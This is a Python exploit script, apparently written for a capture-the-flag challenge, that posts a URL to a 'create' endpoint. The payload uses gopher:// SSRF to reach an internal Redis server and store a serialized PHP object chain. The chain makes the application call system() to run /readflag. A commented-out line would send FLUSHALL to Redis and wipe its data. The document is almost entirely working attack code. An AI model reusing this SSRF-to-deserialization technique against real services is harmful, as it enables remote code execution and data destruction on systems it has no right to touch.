import requests

url = "http://localhost:10004/create"
# url = "http://edu-ctf.zoolab.org:10099/create"

payload = """
gopher://redis:6379/
    _SET%20c8763%20
        'O:10:"Bullet\App":1:{
            S:13:"\\00*\\00_callbacks";a:1:{
                s:6:"custom";a:1:{
                    s:11:"previewCard";a:2:{
                        i:0;O:10:"Bullet\App":2:{
                            S:13:"\\00*\\00_callbacks";a:1:{
                                s:6:"domain";a:2:{
                                    i:0;a:1:{
                                        s:24:"edu-ctf.zoolab.org:10099";a:2:{
                                            i:0;O:10:"Bullet\App":1:{
                                                S:15:"\\00*\\00_currentPath";s:4:"fuck";
                                            }
                                            i:1;s:11:"currentPath";
                                        }
                                    }
                                    i:1;a:1:{
                                        s:24:"edu-ctf.zoolab.org:10099";a:2:{
                                            i:0;O:10:"Bullet\App":1:{
                                                S:15:"\\00*\\00_currentPath";s:26:"/readflag%20give%20me%20the%20flag";
                                            }
                                            i:1;s:11:"currentPath";
                                        }
                                    }
                                }
                            }
                            S:20:"\\00*\\00_responseHandlers";a:1:{
                                i:0;a:1:{
                                    s:9:"condition";s:6:"system";
                                }
                            }
                        }
                        i:1;s:3:"run";
                    }
                }
            }
        }'
    %0D%0A
"""

for c in [" ", "\n"]:
    payload = payload.replace(c, "")

for c in ["\\", "\"", "{", "}"]:
    payload = payload.replace(c, "\\\\\\" + c)

payload = payload.replace("'", "\\\"")

# payload = r"gopher://redis:6379/_flushall%0D%0A"
data = {
    "url": payload
}

print(payload)
res = requests.post(url, data=data)
